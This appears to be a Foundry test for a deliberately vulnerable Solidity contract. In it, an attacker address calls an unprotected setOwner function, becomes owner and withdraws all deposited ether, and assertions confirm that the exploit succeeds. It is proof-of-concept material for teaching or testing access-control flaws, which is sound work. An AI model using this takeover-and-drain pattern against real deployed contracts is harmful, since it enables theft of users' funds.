// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.0;

import {Test, console} from "forge-std/Test.sol";

import {AccessControl} from "../src/AccessControl.sol";
import {Vm} from "forge-std/Vm.sol";



contract AccessControlTest is Test {
    AccessControl public vulnerable;
    address public owner = address(0x1);
    address public attacker = address(0x2);
    
    function setUp()  public {
        vm.prank(owner);
        vulnerable = new AccessControl();
        vm.deal(owner, 10 ether);

        vulnerable.deposit{value: 10 ether}();
        vm.stopPrank();
    }


    function testAccessControlExploit() public{
        vm.deal(attacker, 2 ether);


        vm.prank(attacker);
        vulnerable.deposit{value: 1 ether}();


        vm.prank(attacker);
        vulnerable.setOwner(attacker);

        assertEq(vulnerable.owner(),attacker,"Exploit Failed: ownwer is supposed to be the attacker");


        uint256 attackerInitialbalance = attacker.balance;

        vm.prank(attacker);
        vulnerable.withdrawAll();


        uint256 attackerFinalBalance = attacker.balance;

        assertGt(attackerFinalBalance,attackerInitialbalance,"Exploit Failed, Balance is not supposed to be same");
        assertEq(address(vulnerable).balance + vulnerable.balances(attacker), 10 ether, "Eploit failed");

        // vm.stopPrank();

    }
}